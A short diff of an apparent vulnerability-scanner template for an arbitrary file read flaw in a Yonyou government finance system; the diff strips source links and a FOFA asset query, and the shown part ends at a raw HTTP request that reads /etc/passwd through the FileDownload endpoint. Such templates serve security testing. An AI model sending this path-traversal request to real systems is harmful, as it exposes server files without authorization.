@@ -3,12 +3,8 @@ info:
   name: 用友政财务系统 FileDownload 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aw6p0mbql7oc7ggf'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: aw6p0mbql7oc7ggf
-    fofa: app="用友-政务财务系统"
 http:
 - raw:
   - 'GET /bg/attach/FileDownload?execlPath=/etc/passwd  HTTP/1.1
